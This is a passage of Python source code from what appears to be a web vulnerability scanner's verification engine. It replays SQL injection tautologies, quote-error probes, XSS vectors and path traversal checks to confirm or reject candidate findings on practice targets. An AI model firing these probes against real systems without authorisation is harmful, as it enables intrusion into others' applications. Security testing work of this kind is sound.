"""Phase 9: Verification Engine + Phase 12: Finding Intelligence (dedup/correlation/risk)
+ Phase 19: Strategy Store (deterministic, verified-outcomes-only learning)
+ Phase 20: Failure Memory + Phase 18: Repair Gate infrastructure.
"""
from __future__ import annotations
import json, math, os, time, hashlib, re
from .core import Endpoint, EventBus, Finding, FindingStatus, Severity, Verification, ParamKind
from .http_engine import RequestEngine, RequestMutation
from .detect import (SQLiDetector, XSSDetector, TraversalDetector, RedirectDetector,
                      passive_audit, SECURITY_HEADERS)

# ---- VF-01 (v4.2.0) fail-closed verification defaults --------------------------
# The single-response presence classes: the ONLY finding types that may be
# VERIFIED without a replay. Extending this set is a deliberate, reviewable act.
_PRESENCE_VERIFIED_TYPES = frozenset({
    "missing_security_headers",     # absence proven by ONE response (no oracle exists)
    "server_banner_disclosure",     # the banner IS the response content
    "tech_banner_disclosure",       # ditto
    "vulnerable_js_dependency",     # the served asset name/version IS the observation
})


# ============================================================ VERIFICATION (Phase 9)
class VerificationEngine:
    """Candidate -> re-test with independent variant -> evidence -> confidence -> verdict.
    A candidate is NEVER a finding until this passes (spec: Candidate != Truth)."""

    def __init__(self, engine: RequestEngine, bus: EventBus, oast=None, browser=None):
        self.engine, self.bus, self.oast = engine, bus, oast
        self.browser = browser     # Phase 50: BrowserEngine | None — xss_dom re-probes

    def _replay(self, ep: Endpoint, param: str, value: str):
        return self.engine.send(RequestMutation(endpoint=ep, param_name=param, param_value=value))

    # ---- GTP-10 chain re-execution helpers (VR-27 / VR-28) -----------------
    # The chain findings carry their full replay recipe as JSON in the
    # chain_legs evidence raw_snippet: {"read_url", "read_param",
    # "read_method", "artifact", "write_param"}. Verification rebuilds BOTH
    # legs from it with FRESH markers.
    @staticmethod
    def _chain_recipe(f: Finding) -> dict | None:
        import json as _json
        for e in f.evidence:
            if e.kind == "chain_legs" and (e.raw_snippet or "").strip().startswith("{"):
                try:
                    return _json.loads(e.raw_snippet)
                except Exception:
                    return None
        return None

    def _chain_read(self, recipe: dict) -> str:
        from .core import Endpoint as _E, ParamLocation
        _loc27 = recipe.get("read_loc") or "query"
        try:
            _loc27 = ParamLocation(_loc27)
        except ValueError:
            _loc27 = ParamLocation.QUERY
        ep = _E(url=recipe.get("read_url", ""), method=recipe.get("read_method", "GET"))
        r = self.engine.send(RequestMutation(endpoint=ep,
                                             param_name=recipe.get("read_param", ""),
                                             param_location=_loc27,
                                             param_value=recipe.get("artifact", ""),
                                             note="vr-chain-read"))
        if r is None or r.error:
            return ""
        return r.body or ""

    def _chain_write(self, f: Finding, ep: Endpoint | None, recipe: dict, value: str):
        from .core import Endpoint as _E, ParamLocation
        from .detect import last_path_segment
        # CR-2 (crypto recall round): the five Benchmark input channels replay
        # through the SAME channel mutation the detector used — a value/param
        # swap would probe a channel the app never reads (the PT-2 lesson).
        _chanw = recipe.get("write_channel") or ""
        if _chanw in ("header", "hdrname", "cookie", "qs", "valmatch"):
            from .chainphase import chain_channel_mutation
            wep = _E(url=f.endpoint_url, method="POST")
            m = chain_channel_mutation(wep, _chanw, value)
            if m is None:
                return None
            return self.engine.send(m)
        _locw = recipe.get("write_loc") or "query"
        try:
            _locw = ParamLocation(_locw)
        except ValueError:
            _locw = ParamLocation.QUERY
        # GTP-12f: honor the recipe's write method — the form-body channel
        # rides POST (GET-with-body is structurally dead in the transport)
        _methw = recipe.get("write_method") or f.method or "POST"
        if ep is not None:
            return self._replay(ep, recipe.get("write_param") or
                                next((p.name for p in ep.parameters
                                      if p.kind != ParamKind.TOKEN and not p.flow_control),
                                     last_path_segment(ep.url)), value)
        wep = _E(url=f.endpoint_url, method=_methw)
        wparam = recipe.get("write_param") or last_path_segment(f.endpoint_url)
        return self.engine.send(RequestMutation(endpoint=wep, param_name=wparam,
                                                param_location=_locw,
                                                param_value=value, note="vr-chain-write"))

    def _chain_truncate(self, recipe: dict):
        """GTP-12c: zero the artifact through the verified write sink before
        the replay — the read window is the artifact's first 1000 bytes and
        the batteries' own appends have pushed past it. Without a truncate
        leg in the recipe this is a no-op (legacy chains)."""
        from .core import Endpoint as _E, ParamLocation
        if not recipe.get("truncate_url"):
            return None
        _loct = recipe.get("truncate_loc") or "query"
        try:
            _loct = ParamLocation(_loct)
        except ValueError:
            _loct = ParamLocation.QUERY
        tep = _E(url=recipe["truncate_url"], method="POST")
        return self.engine.send(RequestMutation(endpoint=tep,
                                                param_name=recipe.get("truncate_param", ""),
                                                param_location=_loct,
                                                param_value=recipe.get("artifact", ""),
                                                note="vr-chain-truncate"))

    def verify(self, f: Finding, ep: Endpoint | None = None) -> Finding:
        self.bus.emit("VerificationStarted", finding=f.id, type=f.type)
        if f.type == "sql_injection":
            # GTP-01/GTP-02: a finding whose injection rode the parameter NAME
            # (or a synthetic segment) must replay through the SAME channel —
            # a value-mutation replay probes a channel the app never reads.
            _nc = next((e for e in f.evidence if e.kind == "input_channel"), None)
            if _nc is not None and ep is not None:
                from .detect import _clone_ep_rename_param, last_path_segment
                _chan = (_nc.detail or "")
                _anchor = (_chan.split("anchor=")[1].split(" ")[0]
                           if "anchor=" in _chan else "")
                base = "1"
                _pv = "1"
                if _anchor and ep.param(_anchor):
                    _pv = ep.param(_anchor).value or "1"
                    base = _pv if _pv.isdigit() else "1"
                if _chan.startswith("channel=name_channel") and _anchor:
                    epT = _clone_ep_rename_param(ep, _anchor, f"{base}' OR '1'='1' -- ")
                    epF = _clone_ep_rename_param(ep, _anchor, f"{base}' OR '1'='2' -- ")
                    rT = self.engine.send(RequestMutation(endpoint=epT,
                            param_name=f"{base}' OR '1'='1' -- ", param_value=_pv or "1", note="vr-nc-true"))
                    rF = self.engine.send(RequestMutation(endpoint=epF,
                            param_name=f"{base}' OR '1'='2' -- ", param_value=_pv or "1", note="vr-nc-false"))
                elif _chan.startswith("channel=segment_value") and _anchor:
                    rT = self._replay(ep, _anchor, f"{base}' OR '1'='1' -- ")
                    rF = self._replay(ep, _anchor, f"{base}' OR '1'='2' -- ")
                elif _chan.startswith("channel=segment_name") and _anchor:
                    rT = self.engine.send(RequestMutation(endpoint=ep,
                            param_name=f"{base}' OR '1'='1' -- ", param_value=_anchor, note="vr-sn-true"))
                    rF = self.engine.send(RequestMutation(endpoint=ep,
                            param_name=f"{base}' OR '1'='2' -- ", param_value=_anchor, note="vr-sn-false"))
                else:
                    rT = rF = None
                okNC = False
                _nc_method = "re-test:name-channel-pair"
                _nc_notes = ("fresh TRUE/FALSE pair through the same name/segment "
                             "channel reproduced the differential")
                if rT is not None and rF is not None and not rT.error and not rF.error \
                        and rT.status and rF.status:
                    bt, bf = len(rT.body or ""), len(rF.body or "")
                    okNC = ((rT.ok and not rF.ok)
                            or (rT.ok and rF.ok and rT.status == rF.status
                                and abs(bt - bf) > max(200, 0.25 * max(bt, bf, 1))))
                if not okNC:
                    # SQ-1 (sqli recall round, live-caught on the OWASP Benchmark
                    # master = v1.2): resolver-shaped result pages show NOTHING on
                    # either side of the tautology (the USERS table is empty and
                    # the Spring JDBCtemplate surfaces no rows — live-proven on
                    # BenchmarkTest00037/00038: TRUE and FALSE both answer
                    # 200/19B), so the pair-only replay rejects every real catch
                    # on the whole family. The error-based fallback carries the
                    # PATH-B discipline through the NAME channel: a quote-NAMED
                    # probe must reproduce a DB-error STRING while at least ONE
                    # valid-SQL control name stays clean — the '' pair (SELECT
                    # string contexts) or the base-1 value expression (callable
                    # contexts, where '' dies as an unexpected-token error:
                    # live `{call 1''}` -> 500 vs `{call 1-1}` -> 200).
                    from .detect import SQL_ERR_PATTERNS as _SQ1PATS

                    def _nc_sig(r):
                        if r is None or not r.status:
                            return None
                        for _pat in _SQ1PATS:
                            _mm = _pat.search(r.body or "")
                            if _mm:
                                return _mm
                        return None

                    _pv2 = _pv or "1"
                    _epE = _clone_ep_rename_param(ep, _anchor, base + "'")
                    _epP = _clone_ep_rename_param(ep, _anchor, base + "''")
                    _epC = _clone_ep_rename_param(ep, _anchor, base + "-1")
                    rE = self.engine.send(RequestMutation(endpoint=_epE,
                            param_name=base + "'", param_value=_pv2, note="vr-nc-err"))
                    rP = self.engine.send(RequestMutation(endpoint=_epP,
                            param_name=base + "''", param_value=_pv2, note="vr-nc-pair"))
                    rC = self.engine.send(RequestMutation(endpoint=_epC,
                            param_name=base + "-1", param_value=_pv2, note="vr-nc-call"))
                    _err_mm, _pair_mm, _call_mm = _nc_sig(rE), _nc_sig(rP), _nc_sig(rC)
                    if _err_mm and (_pair_mm is None or _call_mm is None):
                        okNC = True
                        _nc_method = "error:name-channel-replay-2variants"
                        _nc_notes = ("name-channel error replay: quote-NAMED reproduces a "
                                     f"DB error string [{_err_mm.group(0)[:60]}] while a "
                                     "valid-SQL control name ('' pair or base-1) stays clean")
                v = Verification(method=_nc_method if okNC else "re-test:name-channel-pair",
                                 passed=okNC,
                                 confidence=0.9 if okNC else 0.15, rounds=2,
                                 notes=(_nc_notes if okNC else
                                        "name-channel differential not reproduced"))
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.VERIFIED if okNC else FindingStatus.REJECTED
                return f
            p = f.parameter
            base = "1"
            if ep and ep.param(p):
                base = ep.param(p).value if ep.param(p).value.isdigit() else "1"
            # PATH A — boolean oracle replay (blind)
            # VF-03 (v4.2.0): the body-diff half used to fire on ANY >200B difference
            # with NO status agreement — a page with volatile content (rotating
            # lists, timestamps, ads) false-positives SQLi. The guard now mirrors
            # PATH D: both responses OK, SAME status, and the difference must
            # exceed max(200, 25% of the larger body).
            r1 = self._replay(ep, p, f"{base} AND 1=1")
            r2 = self._replay(ep, p, f"{base} AND 1=2")
            body_a, body_b = (r1.body or ""), (r2.body or "")
            stable = ((r1.ok and not r2.ok)
                      or (r1.ok and r2.ok and r1.status == r2.status
                          and abs(len(body_a) - len(body_b))
                              > max(200, 0.25 * max(len(body_a), len(body_b), 1))))
            # HARDENING (2026-10-15, supervisor item-1, from-scratch redo): every
            # success Verification below stamps passed=<the OBSERVED boolean that
            # gated the branch> — never a literal True. 8 sites: PATH A=stable,
            # PATH D=okD, PATH C=okC, PATH C'=bool(num_redirect or num_body),
            # PATH D2=okD2, PATH E=okE, csrf=okVR13, nosql-js=js_flip. The ONE
            # deliberate exemption (supervisor ruling): the _PRESENCE_VERIFIED_TYPES
            # allowlist branch — single-response presence IS the whole evidence
            # class there (VF-01 design; no replay oracle exists by nature).
            if stable:
                v = Verification(method="oracle:replay-2round", passed=stable, confidence=0.95, rounds=2,
                                 notes=f"replay TRUE={r1.status} FALSE={r2.status}")
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.VERIFIED
            else:
                # PATH D — VR-04 (live-caught on ginandjuice.shop /catalog?category=):
                # string-context blind SQLi WITHOUT errors and WITHOUT redirects — the
                # OR-tautology changes the RESULT SET (all products vs empty category).
                # Fresh vectors (comparison-based, different from detection payloads)
                # keep this an INDEPENDENT replay: '2'>'1' is TRUE, '1'>'2' is FALSE.
                rd1 = self._replay(ep, p, f"{base}' OR '2'>'1' -- ")
                rd2 = self._replay(ep, p, f"{base}' OR '1'>'2' -- ")
                okD = bool(rd1.status and rd1.status == rd2.status and rd1.ok and
                           abs(len(rd1.body or "") - len(rd2.body or "")) > max(200, 0.25 * max(len(rd1.body or "x"), 1)))
                if okD:
                    v = Verification(method="oracle:or-bodydiff-2round", passed=okD, confidence=0.95, rounds=2,
                                     notes=f"fresh OR-pair body differential: TRUE {len(rd1.body)}B vs FALSE {len(rd2.body)}B")
                    f.verification, f.confidence = v, v.confidence
                    f.status = FindingStatus.VERIFIED
                else:
                    # PATH C — DETECT-01: OR-tautology redirect differential replay (auth bypass,
                    # string context; live-proven on demo.testfire.net/doLogin)
                    # ENG-01: hop_location() is chain-aware — works even though the engine
                    # auto-follows same-host redirects (old code read only final headers).
                    r5 = self._replay(ep, p, f"{base}' OR '1'='1' -- ")
                    r6 = self._replay(ep, p, f"{base}' OR '1'='2' -- ")
                    l5, l6 = (r5.hop_location() if r5 else ""), (r6.hop_location() if r6 else "")
                    # OWSP-27 (NodeGoat round, live-caught on /learn?url=): a
                    # Location that CONTAINS the submitted payload is an
                    # open-redirect ECHO, not an auth-bypass oracle — TRUE/FALSE
                    # locations differ only because the PAYLOADS differ
                    # (behavioral zero). Both sides must echo for the guard to
                    # suppress; real oracles echo neither.
                    from urllib.parse import unquote as _uq27
                    def _echo27(loc, payload):
                        try: return payload in _uq27(str(loc or ""))
                        except Exception: return False
                    _p5, _p6 = f"{base}' OR '1'='1' -- ", f"{base}' OR '1'='2' -- "
                    okC = bool(l5 and l6 and l5 != l6
                               and not (_echo27(l5, _p5) and _echo27(l6, _p6)))
                    if okC:
                        v = Verification(method="oracle:or-redirect-2round", passed=okC, confidence=0.95, rounds=2,
                                         notes=f"replay OR TRUE -> {l5}, FALSE -> {l6}")
                        f.verification, f.confidence = v, v.confidence
                        f.status = FindingStatus.VERIFIED
                    else:
                        # PATH C' — DETECT-06 (v4.2.2, live-caught on demo.testfire.net/doLogin
                        # 2026-10-03): numeric-tautology OR pair with comment. Target drift
                        # neutralized the string-comparison shapes on doLogin while the numeric
                        # shape still bypassed; verification must replay the family that
                        # detection fired on — replaying string shapes only would REJECT a
                        # live vulnerability. Guards mirror PATH C/PATH A exactly.
                        r7 = self._replay(ep, p, f"{base}' OR 1=1-- ")
                        r8 = self._replay(ep, p, f"{base}' OR 1=2-- ")
                        l7, l8 = (r7.hop_location() if r7 else ""), (r8.hop_location() if r8 else "")
                        b7, b8 = (r7.body or "") if r7 else "", (r8.body or "") if r8 else ""
                        num_redirect = (l7 and l8 and l7 != l8
                                        # OWSP-27 echo guard (numeric family)
                                        and not (_echo27(l7, f"{base}' OR 1=1-- ")
                                                 and _echo27(l8, f"{base}' OR 1=2-- ")))
                        num_body = (r7 is not None and r8 is not None and r7.ok and r8.ok
                                    and r7.status == r8.status
                                    and abs(len(b7) - len(b8)) > max(200, 0.25 * max(len(b7), len(b8), 1)))
                        if num_redirect or num_body:
                            note = (f"replay numeric-OR TRUE -> {l7}, FALSE -> {l8}" if num_redirect else
                                    f"fresh numeric-OR body differential: TRUE {len(b7)}B vs FALSE {len(b8)}B")
                            v = Verification(method="oracle:ornum-2round", passed=bool(num_redirect or num_body), confidence=0.95, rounds=2,
                                             notes=note)
                            f.verification, f.confidence = v, v.confidence
                            f.status = FindingStatus.VERIFIED
                        else:
                            # PATH D2 — MAX-09 (maximum internal test, live-caught on
                            # Juice Shop 20.2.0 /rest/products/search?q=): paren-closing
                            # fresh OR pair. WHERE ((name LIKE '%q%' ...)) contexts only
                            # break out with ')) — the flat AND/OR pairs above stay
                            # literal LIKE terms (no differential) or die as unbalanced
                            # parens. Fresh comparison vectors keep this an INDEPENDENT
                            # replay; guards mirror PATH A/D exactly (both OK, same
                            # status, diff > max(200, 25%)).
                            r9 = self._replay(ep, p, f"{base}')) OR '2'>'1' -- ")
                            r10 = self._replay(ep, p, f"{base}')) OR '1'>'2' -- ")
                            okD2 = bool(r9 is not None and r10 is not None and r9.ok and r10.ok
                                        and r9.status == r10.status
                                        and abs(len(r9.body or "") - len(r10.body or ""))
                                        > max(200, 0.25 * max(len(r9.body or "x"), len(r10.body or "x"), 1)))
                            if okD2:
                                v = Verification(method="oracle:paren-or-bodydiff-2round",
                                                 passed=okD2, confidence=0.95, rounds=2,
                                                 notes=(f"fresh paren-closing OR body differential: "
                                                        f"TRUE {len(r9.body)}B vs FALSE {len(r10.body)}B"))
                                f.verification, f.confidence = v, v.confidence
                                f.status = FindingStatus.VERIFIED
                            else:
                                # PATH E — OWSP-16: no-base OR existence-flip replay
                                # (boolean-blind lookup pages: DVWA /sqli_blind/ answers
                                # 200 'exists' vs 404 'MISSING' when the tautology flips).
                                # Fresh comparison vectors (not the detection tautologies):
                                # '2'>'1' TRUE vs '1'>'2' FALSE — an independent replay in
                                # the BR-01 spirit. Guards mirror the detector exactly:
                                # base OK, TRUE OK, FALSE NOT OK.
                                rbE = self._replay(ep, p, base)
                                re1 = self._replay(ep, p, "' OR '2'>'1' -- ")
                                re2 = self._replay(ep, p, "' OR '1'>'2' -- ")
                                okE = bool(rbE is not None and re1 is not None and re2 is not None
                                           and rbE.ok and re1.ok and not re2.ok)
                                if okE:
                                    v = Verification(method="oracle:existence-flip-2round",
                                                     passed=okE, confidence=0.9, rounds=3,
                                                     notes=(f"no-base OR existence flip: base {rbE.status}, "
                                                            f"TRUE {re1.status} ({len(re1.body or '')}B), "
                                                            f"FALSE {re2.status} ({len(re2.body or '')}B)"))
                                    f.verification, f.confidence = v, v.confidence
                                    f.status = FindingStatus.VERIFIED
                                else:
                                    # PATH B — error-based replay (v4.2.3, VF-04 precision
                                    # tightening): the quote replay must reproduce an actual
                                    # DB ERROR STRING. Until v4.2.2 a BARE 5xx counted as
                                    # "error reproduction" — that verified testasp
                                    # Search.asp/Login.asp (tfSearch/tfUName/tfUPass) as
                                    # CRITICAL SQLi on a generic IIS 500 with NO SQL text
                                    # and NO boolean differential (IV13/IV14 comparison
                                    # flagged it; the notes even claimed "reproduce DB
                                    # error" while the evidence said 'no DB string'). A
                                    # status-only signal (DETECT-04) remains a CANDIDATE —
                                    # visible and honest, but never VERIFIED. Endpoints that
                                    # carry a real oracle still verify through PATH A/D/C/C'.
                                    from .detect import SQL_ERR_PATTERNS
                                    import re as _re
                                    alt_quot = base + '"' if "'" in str(f.evidence) else base + "'"
                                    r3 = self._replay(ep, p, base + '"')
                                    r4 = self._replay(ep, p, base + "'")
                                    err_hit = None
                                    for r in (r3, r4):
                                        if r is None or not r.status:
                                            continue
                                        for pat in SQL_ERR_PATTERNS:
                                            mm = pat.search(r.body or "")
                                            if mm:
                                                err_hit = f"{pat.pattern[:40]} matched: {mm.group(0)[:60]}"
                                                break
                                        if err_hit:
                                            break
                                    err_repro = err_hit is not None
                                    v = Verification(method="error:replay-2variants", passed=err_repro,
                                                     confidence=0.9 if err_repro else 0.15, rounds=2,
                                                     notes=(f"quote variants reproduce a DB error string: {err_repro}"
                                                            + (f" [{err_hit}]" if err_hit else "")))
                                    f.verification, f.confidence = v, v.confidence
                                    f.status = FindingStatus.VERIFIED if err_repro else FindingStatus.REJECTED

        elif f.type == "xss_reflected":
            # VR-02 fix (2026-09-27, live-caught on demo.testfire.net): a single fixed
            # variant payload (<img onerror>) let pattern-blacklist WAFs veto genuinely
            # exploitable reflections (FN). Deterministic fix: VECTOR DIVERSITY — a
            # battery of event-handler-distinct probes; verified if ANY reflects raw,
            # confidence scaled by how many independent contexts confirmed.
            # DETECT-14 (Phase 54): the battery is CONTEXT-AWARE — attribute-injection
            # candidates (tag-filtered contexts) are re-verified with no-'<' vectors,
            # Angular-expression candidates with a fresh {{expression}}, so a filter
            # that blocks every tag can no longer veto the very class it produced.
            kinds = {e.kind for e in (f.evidence or [])}
            if "input_channel" in kinds and ep is not None:
                # GTP-01/GTP-02: the canary rode the parameter NAME — the
                # replay must rename a param to a FRESH canary (value-channel
                # replays probe a channel the app never reads).
                from .detect import _clone_ep_rename_param, last_path_segment
                fresh = "<burhanxssvrmk>pro91"
                _qp = next((x for x in ep.parameters
                            if x.kind != ParamKind.TOKEN and not x.flow_control
                            and x.location.value == "query"), None)
                if _qp is not None:
                    epc = _clone_ep_rename_param(ep, _qp.name, fresh)
                    rnc = self.engine.send(RequestMutation(endpoint=epc, param_name=fresh,
                                                           param_value=_qp.value or "1", note="vr-xss-nc"))
                else:
                    seg = last_path_segment(ep.url)
                    rnc = self.engine.send(RequestMutation(endpoint=ep, param_name=fresh,
                                                           param_value=seg, note="vr-xss-nc")) if seg else None
                oknc = bool(rnc is not None and not rnc.error and fresh in (rnc.body or ""))
                # XS-3 (xss recall round, live-caught on the crossover test
                # BenchmarkTest02324 — the last of the 60 xss FNs): the
                # resolver name-channel family crossed with the last-char
                # mangle family — the plain fresh-canary name gets its final
                # char eaten/rewritten by the sink, so `fresh in body` is
                # structurally dead there. The tail fallback (the XS-2
                # discipline applied to the NAME channel): replay the fresh
                # canary with the sacrificial tail as the param NAME and
                # check the UNTAILED fresh as the substring (live: the
                # tailed name reflects as fresh+'zZ'). Plain first — the
                # existing name-channel semantics stay intact everywhere
                # else; the tail only fires when the plain check is dead.
                nc_tier = "plain"
                if not oknc:
                    if _qp is not None:
                        epc = _clone_ep_rename_param(ep, _qp.name, fresh + "zz")
                        rnc2 = self.engine.send(RequestMutation(endpoint=epc,
                                                                param_name=fresh + "zz",
                                                                param_value=_qp.value or "1",
                                                                note="vr-xss-nc-tail"))
                    else:
                        seg2 = last_path_segment(ep.url)
                        rnc2 = self.engine.send(RequestMutation(endpoint=ep, param_name=fresh + "zz",
                                                                param_value=seg2,
                                                                note="vr-xss-nc-tail")) if seg2 else None
                    oknc = bool(rnc2 is not None and not rnc2.error and fresh in (rnc2.body or ""))
                    if oknc:
                        nc_tier = "plain+tail"
                v = Verification(method=f"re-test:fresh-name-canary-{nc_tier}", passed=oknc,
                                 confidence=0.85 if oknc else 0.15, rounds=2 if nc_tier == "plain+tail" else 1,
                                 notes=f"fresh canary through the name channel reflected raw "
                                       f"({nc_tier} tier): {oknc}")
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.VERIFIED if oknc else FindingStatus.REJECTED
                return f
            if "md_datauri_reflection" in kinds:
                # OWSP-34 (NodeGoat round, live-caught on /memos POST memo=):
                # fresh markdown-link canary with a DIFFERENT base64 — the
                # RENDERED ANCHOR must reproduce (the anchor shape is the
                # oracle; the payload text itself is inert, so a plain
                # raw-reflection re-test can never verify this family).
                import base64 as _b64_34, re as _re34
                _b34 = _b64_34.b64encode(b"burhanxssmarkervr").decode()
                fresh34 = f"[burhanxssmarkervrmd](data:text/html;base64,{_b34})"
                r34 = self._replay(ep, f.parameter, fresh34)
                ok34 = False
                ctx34 = ""
                if r34 is not None and r34.body:
                    for m34 in _re34.finditer(r'<a\s[^>]*href=["\']?\s*data:text/html', r34.body):
                        seg34 = r34.body[m34.start():m34.start() + 500]
                        if ("burhanxssmarkervrmd" in seg34) or (_b34 in seg34):
                            ok34, ctx34 = True, seg34[:120]
                            break
                executed_ctx = ok34
                v = Verification(method="re-test:fresh-md-anchor", passed=ok34,
                                 confidence=0.85 if ok34 else 0.15, rounds=1,
                                 notes=f"fresh markdown data:URI canary rendered as a raw "
                                       f"executable anchor: {ok34}"
                                       + (f" [ctx: {ctx34}]" if ctx34 else ""))
            elif "attribute_injection_reflection" in kinds:
                variants = ['pro44" onfocus="vr1', 'pro45" onload="vr2', "pro46' onerror='vr3"]
                passed_vecs = 0
                for alt in variants:
                    r = self._replay(ep, f.parameter, "burhanxssmarker" + alt)
                    if r is not None and ("burhanxssmarker" + alt) in (r.body or ""):
                        passed_vecs += 1
                executed_ctx = passed_vecs >= 1
                conf = 0.9 if passed_vecs >= 2 else (0.8 if passed_vecs == 1 else 0.1)
                v = Verification(method="re-test:attr-battery-3", passed=executed_ctx,
                                 confidence=conf, rounds=len(variants),
                                 notes=f"{passed_vecs}/{len(variants)} attribute-injection vectors "
                                       "reflected raw (no '<' — tag-filter resistant verification)")
            elif "ng_expression_reflection" in kinds:
                # VR-14 (v4.2.3, live-caught on ginandjuice.shop /catalog?searchTerm):
                # the fresh {{expression}} must land in a BINDING context — reflected
                # raw AND outside <script>/<style> content. AngularJS never
                # interpolates script/style element content, so a script-string
                # reflection is not client-side evaluation (IV14 adjudicated the
                # searchTerm claim as this exact false positive: {{91*7}} raw inside
                # `var searchText = '...'` while every breakout was neutralized).
                from .detect import in_script_or_style
                fresh = "{{19*3}}burhanngvr"
                r = self._replay(ep, f.parameter, fresh)
                body = (r.body or "") if r is not None else ""
                i = body.find(fresh)
                executed_ctx = (r is not None and i >= 0 and "ng-app" in body.lower()
                                and not in_script_or_style(body, i))
                v = Verification(method="re-test:fresh-ng-expression", passed=executed_ctx,
                                 confidence=0.85 if executed_ctx else 0.1, rounds=1,
                                 notes=f"fresh Angular expression reflected raw in a BINDING context "
                                       f"(outside script/style) on an ng-app page: {executed_ctx}")
            else:
                variants = [
                    "<img src=x onerror=burhan42()>",              # classic img/onerror
                    "<details open ontoggle=burhan42()>",          # auto-fires on toggle
                    "<svg><animate onbegin=burhan42() attributeName=x>",  # svg onbegin
                    "<svg\nonload=burhan42()>",                    # newline separator
                    "<iframe srcdoc=burhan42()>",                  # srcdoc context
                    "<burhanxssmarker>vr2</burhanxssmarker>",    # raw-tag canary re-check
                ]
                passed_vecs = 0
                tier = "plain"
                for alt in variants:
                    r = self._replay(ep, f.parameter, alt)
                    if r is not None and alt in (r.body or ""):
                        passed_vecs += 1
                # XS-2 (xss recall round, live-caught on the OWASP Benchmark
                # master = v1.2 — the whole remaining 27 of the 60 xss FNs):
                # the last-char-mangle family. The source destroys exactly ONE
                # trailing character of every input before the writer sink
                # reflects it — substring(0, len-1) drops it, StringBuilder
                # .replace(len-1, len, "Z") rewrites it — so EVERY plain
                # vector verbatim check fails (0/6) and the family was
                # REJECTED family-wide even when the detector caught it. The
                # tailed tier: when the plain tier got nothing, replay each
                # vector with a two-char sacrificial tail (alt+'zz') and
                # check the UNTAILED vector as the substring — drop-last
                # leaves VECTOR+'z', Z-rewrite leaves VECTOR+'zZ'; either
                # way the untailed vector survives verbatim in the body.
                # Plain tier first keeps the existing VR-02 semantics intact
                # on ordinary surfaces; the tail tier only adds the mangle
                # discipline where the plain one is structurally dead.
                if passed_vecs == 0:
                    tier = "plain+tail"
                    for alt in variants:
                        r = self._replay(ep, f.parameter, alt + "zz")
                        if r is not None and alt in (r.body or ""):
                            passed_vecs += 1
                executed_ctx = passed_vecs >= 1
                conf = 0.9 if passed_vecs >= 2 else (0.75 if passed_vecs == 1 else 0.15)
                v = Verification(method=f"re-test:variant-battery-6-{tier}", passed=executed_ctx,
                                 confidence=conf, rounds=len(variants) * (2 if tier == "plain+tail" else 1),
                                 notes=f"{passed_vecs}/{len(variants)} diverse vectors reflected raw "
                                       f"({tier} tier, WAF-resistant verification)")
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if executed_ctx else FindingStatus.REJECTED

        elif f.type == "xss_stored":
            # DETECT-16 (v4.2.3) verification: full re-execution with a FRESH canary.
            # The detection flow (fresh form fetch -> canary submit -> render surfaces
            # with persistence control) runs AGAIN end-to-end; the fresh marker must
            # persist raw on at least one recorded surface. Never a replay of the
            # detection request — a stored reflection must be reproducible from a
            # clean submit.
            from .detect import stored_xss_flow, StoredXSSDetector
            surfaces = None
            for e in (f.evidence or []):
                if e.kind == "stored_xss_surfaces" and e.detail.startswith("render surfaces: "):
                    surfaces = [s.strip() for s in e.detail[len("render surfaces: "):].split("|")]
            origin_url = StoredXSSDetector._origin_of(ep) if ep is not None else f.endpoint_url
            fresh_canary = "<burhanstvr2>"
            _o, _s, hits = stored_xss_flow(self.engine, ep, f.parameter, fresh_canary,
                                           origin_url, surfaces=surfaces)
            hit = len(hits) > 0
            v = Verification(method="re-test:fresh-canary-resubmit", passed=hit,
                             confidence=0.9 if hit else 0.15, rounds=2,
                             notes=(f"fresh canary re-submitted via the real form persisted raw on "
                                    f"{hits[0][0]}" if hit else "fresh canary did not persist on any render surface"))
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if hit else FindingStatus.REJECTED

        elif f.type == "xss_dom":
            # BR-01 (Phase 50): the candidate fired with canary A via a real browser
            # execution proof (window flag set by onerror). Verification = INDEPENDENT
            # re-probe with a FRESH canary B — both must execute. Deterministic:
            # the flag can only be set if the browser parsed our payload as markup.
            if self.browser is None:
                v = Verification(method="re-probe:fresh-canary", passed=False, confidence=0.1,
                                 rounds=0, notes="browser engine unavailable — cannot re-verify DOM execution")
            else:
                import hashlib as _h9
                fresh = ("dom" + _h9.sha1(f"{f.id}|{f.run_id}|br01".encode()).hexdigest()[:8])
                r = self.browser.probe_dom_xss(f.endpoint_url, f.parameter, fresh,
                                               source=next((e.detail.split("source=")[-1].split()[0]
                                                            for e in f.evidence if "source=" in e.detail), "search"))
                ok = bool(r and r.get("fired"))
                v = Verification(method="re-probe:fresh-canary", passed=ok,
                                 confidence=0.9 if ok else 0.15, rounds=1,
                                 notes=f"fresh canary {fresh!r} executed as markup: {ok}")
            f.verification, f.confidence = v, v.confidence
            f.status = FindingStatus.VERIFIED if v.passed else FindingStatus.REJECTED

        elif f.type == "path_traversal":
            # DETECT-17 (v4.2.3): path-based traversal findings (no parameter — the
            # URL itself carries the payload). Verification = fresh GET of the exact
            # traversal URL; the file marker must appear again. Param-based findings
            # keep the alt-depth replay below.
            kinds = {e.kind for e in (f.evidence or [])}
            if "path_file_marker" in kinds:
                r = self.engine.send(RequestMutation(endpoint=Endpoint(url=f.endpoint_url),
                                                     note="path-trav-verify"))
                from .detect import TraversalDetector as _TD, entity_normalize as _en
                body = _en((r.body or "")) if (r is not None and r.status) else ""
                hit = bool(r is not None and r.status and not r.error) \
                      and any(m in body for m, _ in _TD.MARKERS)
                v = Verification(method="re-test:same-path-marker", passed=hit,
                                 confidence=0.9 if hit else 0.15, rounds=1,
                                 notes=f"fresh GET of the traversal URL reproduces the file marker: {hit}")
                f.verification, f.confidence = v, v.confidence
                f.status = FindingStatus.VERIFIED if hit else FindingStatus.REJECTED
                return f
            # GTP-03b (round 2): the exists_oracle family had NO branch — every
            # candidate fell into the local-fixture variants below (secret.txt /
            # BURHAN-SECRET-FILE) and was auto-rejected: 151 candidates on the
            # round-1 chunk scan, ZERO survived. The honest replay: a FRESH
            # known-vs-missing pair at a DIFFERENT depth must reproduce the
            # differential (status flip, or entity-normalized bodies differing
            # beyond the echoed payloads).
            if "param_name_oracle" in kinds:
                # PT-3 VR: replay the param-NAME channel with a FRESH control
                # name — '..' (the base's parent, must exist) vs fresh random
                # (must not), both carrying the endpoint-basename value, on a
